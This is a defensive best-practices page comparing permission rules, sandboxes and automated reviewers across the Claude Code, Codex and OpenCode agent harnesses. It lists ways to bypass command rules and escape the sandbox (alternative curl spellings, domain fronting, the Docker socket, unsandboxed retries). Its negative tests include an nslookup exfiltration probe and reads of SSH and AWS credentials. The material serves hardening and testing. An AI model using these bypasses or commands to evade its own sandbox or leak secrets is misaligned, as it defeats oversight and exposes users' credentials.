# Permissions and sandbox

Permissions decide, for each tool call, whether the harness runs it, asks first, or refuses it. The sandbox is a separate, OS-level boundary that limits what executed commands can read, write and reach on the network, whatever was approved. Together they let an agent work without a prompt for every step while limiting the damage of a wrong or injected action.

Both parts are on one page because both leads couple them: Codex picks its approval behavior together with a sandbox mode, and the Claude Code sandbox changes which commands need a prompt (auto-allow). Where each setting lives (user, project, policy) is on [configuration](configuration.md).

## Comparison

| Dimension | Claude Code | Codex | OpenCode |
| --- | --- | --- | --- |
| Decisions | `allow`, `ask`, `deny` ([CC](../vendors/claude-code/permissions-and-sandbox.md#rule-syntax)) | Rules: `allow`, `prompt`, `forbidden` ([Codex](../vendors/codex/permissions-and-sandbox.md#rules-execpolicy-experimental)) | `allow`, `ask`, `deny` ([OC](../vendors/opencode/permissions-and-sandbox.md#actions)) |
| Rule targets | Any tool: `Bash(...)`, `Read(...)`, `Edit(...)`, `WebFetch(domain:...)`, `mcp__...` ([CC](../vendors/claude-code/permissions-and-sandbox.md#rule-syntax)) | Shell command prefixes (Starlark `prefix_rule`); MCP tools per tool; files and network via the sandbox ([Codex](../vendors/codex/permissions-and-sandbox.md#rules-execpolicy-experimental)) | One key per tool ([OC](../vendors/opencode/permissions-and-sandbox.md#keys)) |
| Command matching | Glob over the command; compound commands split; wrappers like `timeout` stripped ([CC](../vendors/claude-code/permissions-and-sandbox.md#bash-and-powershell)) | Token prefix; simple `sh -c` scripts split; complex scripts evaluated whole ([Codex](../vendors/codex/permissions-and-sandbox.md#approvals-and-rules)) | Glob over the parsed command ([OC](../vendors/opencode/permissions-and-sandbox.md#pattern-syntax)) |
| Conflicts | deny, then ask, then allow; deny in any scope beats allow in any scope ([CC](../vendors/claude-code/permissions-and-sandbox.md#rule-evaluation)) | Most restrictive wins: `forbidden` > `prompt` > `allow` ([Codex](../vendors/codex/permissions-and-sandbox.md#approvals-and-rules)) | Last matching rule wins ([OC](../vendors/opencode/permissions-and-sandbox.md#pattern-syntax)) |
| Rule location | `permissions` in any settings file; lists merge ([CC](../vendors/claude-code/permissions-and-sandbox.md#locations-and-scopes)) | `rules/*.rules` next to each config layer; project rules only if trusted ([Codex](../vendors/codex/permissions-and-sandbox.md#locations-and-scopes)) | `permission` in any config layer or per agent ([OC](../vendors/opencode/permissions-and-sandbox.md#locations-and-scopes)) |
| Approval presets | Modes `default`, `acceptEdits`, `plan`, `auto`, `dontAsk`, `bypassPermissions` ([CC](../vendors/claude-code/permissions-and-sandbox.md#permission-modes)) | `approval_policy` plus `sandbox_mode` or permission profile ([Codex](../vendors/codex/permissions-and-sandbox.md#approval_policy)) | Per-key defaults; `--auto` ([OC](../vendors/opencode/permissions-and-sandbox.md#loading-and-invocation)) |
| Launch default | `auto` in terminal and VS Code since v2.1.283 ([CC](../vendors/claude-code/permissions-and-sandbox.md#starting-mode-and-switching)) | Version-controlled folder: `workspace-write` + `on-request`; else read-only ([Codex](../vendors/codex/permissions-and-sandbox.md#launch-defaults)) | Most tools `allow` ([OC](../vendors/opencode/permissions-and-sandbox.md#keys)) |
| Automated reviewer | `auto` mode classifier ([CC](../vendors/claude-code/permissions-and-sandbox.md#permission-keys)) | `approvals_reviewer = "auto_review"`; fails closed ([Codex](../vendors/codex/permissions-and-sandbox.md#approvals_reviewer-auto-review)) | None |
| Full bypass | `--dangerously-skip-permissions`; refused as root ([CC](../vendors/claude-code/permissions-and-sandbox.md#limits-and-gotchas)) | `--yolo` ([Codex](../vendors/codex/permissions-and-sandbox.md#sandbox_mode-legacy-still-primary-in-the-docs)) | `"permission": "allow"` ([OC](../vendors/opencode/permissions-and-sandbox.md#format)) |
| Protected paths | Writes to `.git`, `.claude`, `.vscode`, shell rc files, `.mcp.json` never auto-approved ([CC](../vendors/claude-code/permissions-and-sandbox.md#protected-paths)) | `.git`, `.agents`, `.codex` read-only inside writable roots ([Codex](../vendors/codex/permissions-and-sandbox.md#protected-paths)) | Default `.env` read deny only ([OC](../vendors/opencode/permissions-and-sandbox.md#keys)) |
| Sandbox | Off by default; `sandbox.enabled` ([CC](../vendors/claude-code/permissions-and-sandbox.md#sandbox-coverage)) | Always on via `sandbox_mode` or profile ([Codex](../vendors/codex/permissions-and-sandbox.md#sandbox_mode-legacy-still-primary-in-the-docs)) | None documented ([OC](../vendors/opencode/permissions-and-sandbox.md)) |
| Sandbox covers | Bash, PowerShell, Monitor and children; not file tools, hooks, MCP servers ([CC](../vendors/claude-code/permissions-and-sandbox.md#sandbox-coverage)) | Commands Codex runs; `allow` rules run outside it ([Codex](../vendors/codex/permissions-and-sandbox.md#rules-execpolicy-experimental)) | — |
| macOS / Linux / Windows | Seatbelt / bubblewrap / unsandboxed natively, WSL2 works ([CC](../vendors/claude-code/permissions-and-sandbox.md#sandbox-coverage)) | Seatbelt / bubblewrap + seccomp / native sandbox ([Codex](../vendors/codex/permissions-and-sandbox.md#platform-implementations)) | — |
| Default reads | Whole machine, including `~/.ssh` ([CC](../vendors/claude-code/permissions-and-sandbox.md#sandbox-coverage)) | Not stated for legacy modes ([Codex](../vendors/codex/permissions-and-sandbox.md#permission-profiles-beta)) | — |
| Network | Proxy with an allowlist that starts empty ([CC](../vendors/claude-code/permissions-and-sandbox.md#sandbox-keys)) | Off in `workspace-write`; experimental domain proxy ([Codex](../vendors/codex/permissions-and-sandbox.md#network)) | — |
| Escape path | `dangerouslyDisableSandbox` retry; `excludedCommands` ([CC](../vendors/claude-code/permissions-and-sandbox.md#sandbox-keys)) | Escalation through approval; `allow` rules ([Codex](../vendors/codex/permissions-and-sandbox.md#approval_policy)) | — |
| Inspect | `/permissions`, `/sandbox` ([CC](../vendors/claude-code/permissions-and-sandbox.md#cli-and-slash-commands)) | `/permissions`, `codex execpolicy check` ([Codex](../vendors/codex/permissions-and-sandbox.md#testing)) | Not recorded |

## Generalized model

**Action request.** A tool name plus its input (command line, file path, URL, MCP tool name). **Decision.** `allow` (run), `ask` (prompt the user or a reviewer), or `deny` (refuse and tell the model).

**Evaluation pipeline** for each request:

1. **Policy rules** from the administrator.
2. **Rules** from user and project configuration. Across all sources the most restrictive match wins (deny over ask over allow).
3. **Hooks** may return a decision. In Claude Code they cannot weaken a deny or ask rule.
4. **Protected categories** are never auto-approved: writes to harness config directories and `.git`, destructive operations, tools marked as needing a user.
5. **Approval preset** decides requests no rule matched.
6. **Automated reviewer**, if enabled, answers the prompt using a policy text.
7. **User prompt.** The answer can be saved as a new rule.

**Sandbox policy**, applied by the OS to processes the agent starts:

- **Filesystem:** writable roots (working directory, temp, added directories), read denials, and protected paths that stay read-only inside writable roots. The more specific path wins.
- **Network:** off, filtered by a local proxy with a domain allowlist (deny wins), or unrestricted.
- **Escalation:** a command that fails in the sandbox can re-run outside it only through an approval or an explicit rule. An administrator can turn this off.
- **Coverage:** shell commands and their children. MCP servers and harness-internal processes are outside it in both leads.

**Approval presets.** The mapping is approximate: Claude Code uses one mode, Codex combines an approval policy with a sandbox mode.

| Preset | Claude Code | Codex | OpenCode |
| --- | --- | --- | --- |
| Ask before changes | `default` | `read-only` + `on-request` | `edit: ask`, `bash: ask` |
| Edit the workspace freely | `acceptEdits` | `workspace-write` + `on-request` | Default rules |
| Reviewer answers prompts | `auto` | `approvals_reviewer = "auto_review"` | — |
| Unattended, never prompt | `dontAsk` (denies what would prompt) | `never` (effect on requests needing approval not documented) | `--auto` (approves what would ask) |
| No limits | `bypassPermissions` | `--yolo` | `"permission": "allow"` |

| Generalized term | Claude Code | Codex | OpenCode |
| --- | --- | --- | --- |
| Rule | `permissions.allow/ask/deny` entry | `prefix_rule(...)` | `permission` entry |
| Decision | `allow`/`ask`/`deny` | `allow`/`prompt`/`forbidden` | `allow`/`ask`/`deny` |
| Hook decision point | `PreToolUse` | `PermissionRequest` | `permission.ask` |
| Sandbox policy | `sandbox` object | `sandbox_mode` / `[permissions.<name>]` | — |
| Writable root | `sandbox.filesystem.allowWrite`, `--add-dir` | `writable_roots`, `--add-dir` | `external_directory` |
| Read denial | `sandbox.filesystem.denyRead`, `Read(...)` deny | Profile `filesystem` `deny`, admin `deny_read` | `read` deny |
| Network allowlist | `sandbox.network.allowedDomains` | `network.domains` (proxy) | — |
| Escalation | `dangerouslyDisableSandbox` retry | Sandbox approval, `allow` rule | — |
| Admin constraint | Managed `permissions`, `disableBypassPermissionsMode` | `allowed_approval_policies`, `allowed_sandbox_modes` | Managed config |

## When to use it and when not

| Use it when | Mechanism |
| --- | --- |
| A capability must never be used (read a secret path, reach a host) | Sandbox read denial or network allowlist, plus a deny rule |
| A human must see an action first (`git push`, deploy, publish) | Content-scoped ask rule; in Claude Code it survives sandbox auto-allow and auto mode (inference) |
| Routine project commands should run without prompts | Exact allow rules, or sandbox auto-allow |
| Rules leave too many prompts | Automated reviewer, on top of the sandbox |
| An unattended or bypass run must be contained | Outer isolation: sandbox runtime, container, VM, cloud session |

| Do not use it for | Use instead | Cost or risk of using permissions |
| --- | --- | --- |
| Checks on arguments, repository state or time of day | `PreToolUse` hook, see [hooks.md](hooks.md) | Rules cannot express context; hooks can, but are steering, not a boundary |
| Conventions the model should follow | [instructions.md](instructions.md) | Rules only allow or block; they do not explain |
| Containing MCP servers, hooks or file tools | Outer isolation; MCP allowlists in [mcp.md](mcp.md) | The per-command sandbox confines shell commands only |
| Exfiltration control through command patterns alone | Sandbox network isolation | Alternative spellings bypass command rules in both leads |
| The authoritative merge gate | CI, see [automation.md](automation.md) | Independent of any agent configuration |

## Approaches

### Rule lists

**What.** Patterns per tool or command prefix, each mapped to a decision. **When.** Always, as the first filter; cheap and visible. **How.** Claude Code: `permissions.allow/ask/deny` for any tool; "don't ask again" saves a permanent per-repository Bash rule ([CC permissions](https://code.claude.com/docs/en/permissions)). Codex: `prefix_rule(pattern, decision, justification, match, not_match)` in `rules/*.rules`; scripts with redirection, substitution or variables are evaluated as one `bash -lc` invocation; rules are experimental ([Codex rules](https://learn.chatgpt.com/codex/rules)). OpenCode: last match wins, so put `"*"` first. **Trade-off.** Rules match the text the model usually produces, not the program.

### Per-command OS sandbox

**What.** Seatbelt (macOS) or bubblewrap (Linux) around shell commands: writable roots, read denials, network proxy. **When.** Every local session; it is the enforcement layer behind the rules. **How.** Claude Code: enable with `sandbox.enabled` or `/sandbox`; auto-allow runs sandboxed commands without prompts, while deny rules, content-scoped ask rules and critical-path `rm` still apply ([CC sandboxing](https://code.claude.com/docs/en/sandboxing)). Codex: `workspace-write` is the default for app, CLI and IDE; `on-request` "approves actions allowed by sandbox automatically; requires approval for escalations"; Linux needs `bubblewrap` ([Codex sandboxing](https://learn.chatgpt.com/codex/sandboxing)). OpenCode: none; isolate externally. **Trade-off.** The same task can need approvals in Codex and none in Claude Code.

### Automated reviewer

**What.** A model answers approval prompts using a policy text. **When.** Hands-off work with too many prompts; not as the only control for unattended or high-stakes runs. **How.** Claude Code auto mode drops broad allow rules (`Bash(*)`, `Bash(python*)`, package-manager run commands) on entry, blocks `curl | bash`, force push, production deploys and similar by default, and falls back to prompting after 3 consecutive or 20 total blocks ([CC permission modes](https://code.claude.com/docs/en/permission-modes)). Codex auto-review reviews only escalations, checks for exfiltration and credential probing, fails closed, and trips after 3 consecutive denials or 10 within 50; policy from `[auto_review].policy` or org `guardian_policy_config` ([Codex auto-review](https://learn.chatgpt.com/codex/sandboxing/auto-review)). **Trade-off.** Double-digit miss rates on overeager actions ([practice 9](#practices)).

### Outer isolation

**What.** A boundary around the whole harness process, so file tools, MCP servers and hooks are inside it. **When.** Unattended runs, bypass modes, untrusted repositories. **How.** Claude Code's ladder, weakest to strongest: sandboxed Bash → sandbox runtime `@anthropic-ai/sandbox-runtime` (whole process; beta) → dev container → custom container → VM → cloud session ([CC sandbox environments](https://code.claude.com/docs/en/sandbox-environments)). The reference dev container uses a default-deny firewall and a non-root user ([CC devcontainer](https://code.claude.com/docs/en/devcontainer)). Codex names Docker as acceptable isolation for `--yolo`; no Codex equivalent of the sandbox runtime was found. **Trade-off.** "Any approach that allows network egress can still leak data the agent can read"; a dev container in bypass mode can still exfiltrate the credentials in `~/.claude`.

## Practices

1. **Deny secrets and destructive actions, ask for externally visible ones, allow only exact routine commands.**
   - Why: Deny means "never", ask means "a human must see this", allow covers the project's own commands.
   - How: Deny `Read`/`Edit` of `~/.ssh/**`, `~/.aws/**`, `~/.gnupg/**`, `~/.kube/**`, `~/.git-credentials`, `~/.config/gh/**` and similar; ask on `git push`, publish, deploy; allow `npm test`, `make lint`. See [Portability](#portability) for the syntax per harness.
   - Evidence: [Practitioner] [trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config); [Vendor] [CC permissions](https://code.claude.com/docs/en/permissions), [Codex rules](https://learn.chatgpt.com/codex/rules).

2. **Never allow interpreters, package-manager run commands, docker or shell wrappers broadly.**
   - Why: Each runs arbitrary code. In Claude Code a matching allow rule also approves the unsandboxed retry, and auto mode drops exactly these rules.
   - How: Remove `Bash(*)`, `Bash(python*)`, `npm run *`, `docker *` and `bash -c *` allows; use exact commands.
   - Evidence: [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing), [CC permission modes](https://code.claude.com/docs/en/permission-modes).

3. **Treat command rules as guidance and enforce with the sandbox.**
   - Why: A Claude Code Bash rule "isn't a security boundary around the program": `Bash(curl *)` misses `/usr/bin/curl` and `sh -c 'curl ...'`; `Bash(git push *)` misses `git -C . push`. "Read-only" allowlists leak too: CVE-2025-55284 auto-approved `ping`, `nslookup`, `dig`.
   - How: Do not write argument patterns such as `Bash(curl http://github.com/ *)`. Deny `curl` and `wget`, use `WebFetch(domain:...)` plus the sandbox network allowlist.
   - Evidence: [Vendor] [CC permissions](https://code.claude.com/docs/en/permissions), [Codex rules](https://learn.chatgpt.com/codex/rules); [Advisory] [GitLab CVE-2025-55284](https://advisories.gitlab.com/pkg/npm/@anthropic-ai/claude-code/CVE-2025-55284/).

4. **Protect secret paths in both the rule layer and the sandbox.**
   - Why: In Claude Code, `Read(...)` denies govern the Read tool and `sandbox.filesystem.denyRead` governs shell commands. "A `denyRead` entry doesn't stop the Read tool, and `allowedDomains` doesn't limit WebFetch."
   - How: Claude Code: set both; for a lockdown `"denyRead": ["~/"]` with `allowRead` for the project. Codex: profile `filesystem."<path>" = "deny"` (beta, replaces `sandbox_mode`) or admin deny-read globs. OpenCode: `read` deny patterns.
   - Evidence: [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing), [Codex managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration).

5. **Enable filesystem and network isolation together, fail closed, and close the escape hatch.**
   - Why: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys. Without filesystem isolation ... [it] could backdoor system resources." If the Claude Code sandbox cannot start, commands run unsandboxed by default, and a failed command may retry with `dangerouslyDisableSandbox`.
   - How: Claude Code `failIfUnavailable: true` and `allowUnsandboxedCommands: false` (or an ask rule `Bash(dangerouslyDisableSandbox:true)`). Codex: install `bubblewrap` on Linux; restrict escalation with `allowed_sandbox_modes` and `allowed_approval_policies`.
   - Evidence: [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing), [Codex sandboxing](https://learn.chatgpt.com/codex/sandboxing); [Vendor] [Anthropic engineering, sandboxing (2025-10-20)](https://www.anthropic.com/engineering/claude-code-sandboxing).

6. **Prefer write paths over command exclusions, and review exclusions like sudo grants.**
   - Why: "An excluded command runs with your full access." An excluded interpreter or `docker compose` lets the agent write a file and run it unsandboxed; the Docker socket "effectively grants access to the host system".
   - How: Use `allowWrite` for a specific path instead of `excludedCommands`; never expose `/var/run/docker.sock`; no writes to `$PATH` or rc files; do not enable `allowAppleEvents`. In Codex, extend `writable_roots` narrowly.
   - Evidence: [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing), [Codex sandboxing](https://learn.chatgpt.com/codex/sandboxing).

7. **Keep network allowlists narrow.**
   - Why: "Allowing broad domains such as `github.com` can create paths for data exfiltration." The Claude Code proxy trusts the client-supplied hostname, so domain fronting works.
   - How: Allow registries and build hosts only. Claude Code `strictAllowlist: true` (v2.1.219+) denies instead of prompting; review saved `WebFetch(domain:...)` rules. Codex `features.network_proxy.domains`, admin `managed_allowed_domains_only = true`; keep web search in `cached` mode (`--yolo` switches it to `live`).
   - Evidence: [Vendor] [CC sandboxing](https://code.claude.com/docs/en/sandboxing), [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security), [Codex cloud internet access](https://learn.chatgpt.com/codex/cloud/internet-access).

8. **Reduce prompts with the sandbox or a reviewer, not with broad allow rules.**
   - Why: "Claude Code users approve 93% of permission prompts"; sandboxing "safely reduces permission prompts by 84%" in Anthropic's internal use. Both figures are vendor-measured.
   - How: Claude Code sandbox with auto-allow plus ask rules for push and deploy; Codex `workspace-write` with `on-request`.
   - Evidence: [Empirical] [Anthropic engineering, auto mode (2026-03-25)](https://www.anthropic.com/engineering/claude-code-auto-mode), [Anthropic engineering, sandboxing (2025-10-20)](https://www.anthropic.com/engineering/claude-code-sandboxing).

9. **Use automated reviewers on top of a sandbox, not instead of one.**
   - Why: Anthropic measured the auto-mode classifier at 0.4% false positives on real traffic (n=10,000), 17% false negatives on real overeager actions (n=52), 5.7% on synthetic exfiltration (n=1,000). Codex: auto-review "is not a deterministic security guarantee". Adaptive attacks bypassed 12 published injection defenses at "above 90% for most" (2025).
   - How: Enable auto mode or auto-review only with the sandbox on; write a Codex `[auto_review].policy` that names your sensitive systems.
   - Disagreement: Press reports a 13.6% human catch rate versus 89% for the classifier ([letsdatascience](https://letsdatascience.com/news/anthropic-enables-auto-mode-for-claude-code-2be9e2b6)); not found in the primary post. Willison calls 95% capture "very much a failing grade" in security.
   - Evidence: [Empirical] [Anthropic engineering, auto mode](https://www.anthropic.com/engineering/claude-code-auto-mode); [Vendor] [Codex auto-review](https://learn.chatgpt.com/codex/sandboxing/auto-review); [Empirical] [Willison on "The Attacker Moves Second" (2025-11-02)](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/).

10. **Run bypass modes only inside outer isolation, and lock them where not wanted.**
    - Why: `bypassPermissions` "offers no protection against prompt injection"; Codex `--yolo` is for "tightly controlled, trusted environments". s1ngularity malware used bypass flags (2025-08-26).
    - How: Run `--dangerously-skip-permissions` or `--yolo` only in a container, VM or the sandbox runtime, as non-root, with default-deny egress and no host credentials. Lock bypass with Claude Code `disableBypassPermissionsMode: "disable"` (any scope) or Codex `allowed_sandbox_modes`.
    - Disagreement: Claude Code docs ask for isolation "without internet access"; Trail of Bits runs bypass by default with a sandbox or disposable droplet as the control; Willison prefers "someone else's computer" with budget-capped credentials; Codex accepts Docker.
    - Evidence: [Vendor] [CC permission modes](https://code.claude.com/docs/en/permission-modes), [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security); [Practitioner] [trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config), [Willison, Designing agentic loops](https://simonwillison.net/2025/Sep/30/designing-agentic-loops/); [Advisory] [Wiz](https://wiz.io/blog/s1ngularity-supply-chain-attack).

11. **Cut a leg of the lethal trifecta instead of relying on detection.**
    - Why: Private data, untrusted content and an outbound channel together let injected text steer the agent. Meta's "Rule of Two": an agent should have at most two of the three per session.
    - How: Remove egress (narrow allowlist, ask on push) or remove secrets from reach (inference). A coding session has all three by default.
    - Evidence: [Practitioner] [Willison, The lethal trifecta (2025-06-16)](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/), [Meta AI, Agents Rule of Two (2025-10-31)](https://ai.meta.com/blog/practical-ai-agent-security/).

12. **Remove deprecated presets and review remembered approvals.**
    - Why: Codex `approval_policy = "untrusted"` can stop the client from starting; `on-failure` is deprecated. Remembered approvals pile up in Claude Code project rules and Codex `~/.codex/rules/default.rules`.
    - How: Search configs for `untrusted` and `on-failure`; periodically review `/permissions` and `default.rules` for broad entries.
    - Evidence: [Vendor] [Codex agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security), [CC permissions](https://code.claude.com/docs/en/permissions).

## Security

| Threat | Advisory or source | Mitigation |
| --- | --- | --- |
| Prompt injection steers the agent (OWASP ASI01) | Lethal trifecta, Rule of Two (2025); OWASP Agentic Top 10, Dec 2025, from secondary summaries ([Teleport](https://goteleport.com/blog/owasp-top-10-agentic-applications)) | Cut egress or secrets ([practice 11](#practices)) |
| Exfiltration through auto-approved "safe" commands | CVE-2025-55284: Claude Code before 1.0.4 auto-approved `ping`, `nslookup`, `dig`; secrets left as DNS subdomains ([GitLab](https://advisories.gitlab.com/pkg/npm/@anthropic-ai/claude-code/CVE-2025-55284/)) | Sandbox network isolation |
| Model-chosen cwd widens the sandbox | CVE-2025-59532: Codex CLI 0.2.0 to 0.38.0; fixed in 0.39.0 ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-59532)) | Keep Codex updated |
| Malware runs the CLI with bypass flags | s1ngularity / Nx npm compromise, 2025-08-26 ([Wiz](https://wiz.io/blog/s1ngularity-supply-chain-attack), [StepSecurity](https://www.stepsecurity.io/blog/supply-chain-security-alert-popular-nx-build-system-package-compromised-with-data-stealing-malware)) | `disableBypassPermissionsMode`; Codex `allowed_sandbox_modes` |
| Compromised agent extension | CVE-2025-8217: Amazon Q VS Code 1.84.0 shipped a wipe prompt; fixed in 1.85.0 ([AWS-2025-015](https://aws.amazon.com/security/security-bulletins/AWS-2025-015/)) | Least privilege; outer isolation |
| Agent edits its own config | CVE-2025-53773, see [configuration.md](configuration.md) | Protected paths; `allowWrite` and `Edit` allows cannot exempt them |
| Domain fronting through an allowed host | [CC sandboxing](https://code.claude.com/docs/en/sandboxing) | Narrow domains; TLS-terminating proxy |
| Sandbox escape via Docker socket, `$PATH` writes, excluded interpreters | [CC sandboxing](https://code.claude.com/docs/en/sandboxing) | [Practice 6](#practices) |
| MCP servers and hooks outside the sandbox | Both leads | Sandbox runtime or container; MCP allowlist |

Every CVE above exploited something that ran before or outside the permission system (inference). Test those paths, not only the rule lists.

## Verification and checklist

- **Claude Code:** `/permissions` lists rules by source and recently denied calls; `/sandbox` shows resolved protected paths; `claude doctor` flags sandbox misconfiguration. To confirm an `excludedCommands` entry, run it in Manual mode; the prompt says "Bash command (unsandboxed)".
- **Codex:** `codex execpolicy check --pretty --rules <file> -- <command>` shows the strictest decision; add `match`/`not_match` examples as rule self-tests; `/permissions`, `/debug-config`, `codex doctor`.

Negative tests; each must be blocked or prompt (inference from the CVEs):

1. Read `~/.ssh/id_*` and `~/.aws/credentials` via a shell command and via the file-read tool.
2. `curl` an off-allowlist host, then `/usr/bin/curl` and `sh -c 'curl ...'`.
3. `nslookup $(cat secret).example.com`.
4. Write to `.claude/settings.json`, `.codex/config.toml`, `.git/hooks/` and `~/.zshrc`.
5. Force a sandbox failure; check whether an unsandboxed retry is offered.
6. Start with `--dangerously-skip-permissions` or `--yolo`; policy must refuse.
7. Deny events (`tool_decision`) reach the telemetry collector.

- [ ] Secret paths are denied in rules and in the sandbox.
- [ ] Ask rules exist for `git push`, publish, deploy and infrastructure commands.
- [ ] No `Bash(*)`, interpreter, package-manager run, `docker` or `bash -c` allows.
- [ ] Sandbox has filesystem and network isolation and fails closed; unsandboxed retry is off or prompts.
- [ ] `excludedCommands`, `allowUnixSockets`, `allowWrite` and `writable_roots` are reviewed.
- [ ] Network allowlist has no broad domains.
- [ ] Automated reviewer, if used, runs on top of the sandbox.
- [ ] Bypass is locked, or used only inside isolation with restricted egress.
- [ ] No deprecated Codex `untrusted` or `on-failure` presets.
- [ ] Negative tests were run after the last upgrade.

## Portability

There is no shared permissions file. Write each rule once per harness:

| Intent | Claude Code (`.claude/settings.json`) | Codex | OpenCode (`opencode.json`) |
| --- | --- | --- | --- |
| Ask before `git push` | `"ask": ["Bash(git push *)"]` | `prefix_rule(pattern=["git","push"], decision="prompt")` | `"bash": {"git push *": "ask"}` |
| Block `rm -rf` | `"deny": ["Bash(rm -rf *)"]` | `prefix_rule(pattern=["rm","-rf"], decision="forbidden")` | `"bash": {"rm -rf *": "deny"}` |
| Hide `.env` | `"deny": ["Read(./.env)", "Read(./.env.*)"]` | Profile `filesystem` `"**/*.env" = "deny"` (beta) | Default |
| Network to a registry | `sandbox.network.allowedDomains` | `network_access = true`, or `network.domains` with the proxy | No sandbox |

Traps:

- **Rule order.** Claude Code and Codex: most restrictive wins, so an allow cannot narrow a broad deny. OpenCode: last match wins ([OC](../vendors/opencode/permissions-and-sandbox.md#limits-and-gotchas)).
- **Sandbox default.** Claude Code is unsandboxed until enabled; Codex always applies a mode.
- **Network default.** Claude Code proxies to an empty allowlist; Codex `workspace-write` has no network until `network_access = true`, and its proxy filters but does not grant access ([Codex](../vendors/codex/permissions-and-sandbox.md#network)).
- **MCP servers escape the command sandbox in both leads.**
- **Protected config directories.** Edits to `.claude/`, `.codex/` or `.agents/` prompt even in permissive presets; an agent that edits shared config hits prompts in both (inference).
- **`allow` in Codex runs outside the sandbox.**
- **Unattended presets fail differently.** Claude Code `dontAsk` fails closed; OpenCode `--auto` fails open; Codex `never` is not documented.
- **Secrets are readable by default** in the Claude Code sandbox, including `~/.ssh`.

## Dropped from the generalization

| Feature | Vendor | Reason |
| --- | --- | --- |
| `Tool(param:value)` rules; rules for `Agent`, `Skill`, `WebFetch`, `Cd`; `plan` as a permission mode | Claude Code | Codex rules match only command tokens; Codex plan permissions undocumented |
| `sandbox.credentials` masking; `blockReadsOutsideWorkingDirectories`; `--restricted`; mods answering `tool.check` | Claude Code | No Codex counterpart (environment filtering is in [configuration.md](configuration.md)) |
| Granular approval policy; named, inheritable permission profiles; inline rule tests `match`/`not_match`; native Windows sandbox | Codex | No Claude Code counterpart |
| `doom_loop`, `continue_loop_on_deny`, `experimental.policies` | OpenCode | No lead counterpart |

## Open questions

- **Independent evidence.** All approval-fatigue and classifier numbers are vendor-measured; the 13.6% / 89% figure has no primary source.
- **Codex `never`:** what happens to a request that needs approval is not documented.
- **Codex default read scope** for legacy sandbox modes is not documented.
- **Sandbox strength.** No independent evaluation of Seatbelt or bubblewrap for coding agents and no escape benchmark found.
- **Conformance.** Neither lead ships a self-check for permission and sandbox posture.
- **OWASP Agentic Top 10** mitigations come from secondary summaries.

## Sources

- Vendor pages: [Claude Code](../vendors/claude-code/permissions-and-sandbox.md), [Codex](../vendors/codex/permissions-and-sandbox.md), [OpenCode](../vendors/opencode/permissions-and-sandbox.md)
- Research note: [configuration, permissions and sandbox](../research-notes/agent-harness-best-practices/configuration-permissions-sandbox.md)
- Claude Code: [permissions](https://code.claude.com/docs/en/permissions), [permission modes](https://code.claude.com/docs/en/permission-modes), [sandboxing](https://code.claude.com/docs/en/sandboxing), [sandbox environments](https://code.claude.com/docs/en/sandbox-environments), [devcontainer](https://code.claude.com/docs/en/devcontainer), [security](https://code.claude.com/docs/en/security)
- Anthropic engineering: [auto mode](https://www.anthropic.com/engineering/claude-code-auto-mode), [sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
- Codex: [agent approvals & security](https://learn.chatgpt.com/codex/agent-approvals-security), [rules](https://learn.chatgpt.com/codex/rules), [sandboxing](https://learn.chatgpt.com/codex/sandboxing), [auto-review](https://learn.chatgpt.com/codex/sandboxing/auto-review), [cloud internet access](https://learn.chatgpt.com/codex/cloud/internet-access), [managed configuration](https://learn.chatgpt.com/codex/enterprise/managed-configuration)
- OpenCode: [permissions](https://opencode.ai/docs/permissions/)
- Practitioner and research: [trailofbits/claude-code-config](https://github.com/trailofbits/claude-code-config), [Willison, lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/), [Willison, agentic loops](https://simonwillison.net/2025/Sep/30/designing-agentic-loops/), [Willison, injection papers](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/), [Meta, Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/), [letsdatascience](https://letsdatascience.com/news/anthropic-enables-auto-mode-for-claude-code-2be9e2b6), [Teleport on OWASP](https://goteleport.com/blog/owasp-top-10-agentic-applications)
- Advisories: [GitLab CVE-2025-55284](https://advisories.gitlab.com/pkg/npm/@anthropic-ai/claude-code/CVE-2025-55284/), [NVD CVE-2025-59532](https://nvd.nist.gov/vuln/detail/CVE-2025-59532), [Wiz s1ngularity](https://wiz.io/blog/s1ngularity-supply-chain-attack), [StepSecurity Nx](https://www.stepsecurity.io/blog/supply-chain-security-alert-popular-nx-build-system-package-compromised-with-data-stealing-malware), [AWS-2025-015](https://aws.amazon.com/security/security-bulletins/AWS-2025-015/)
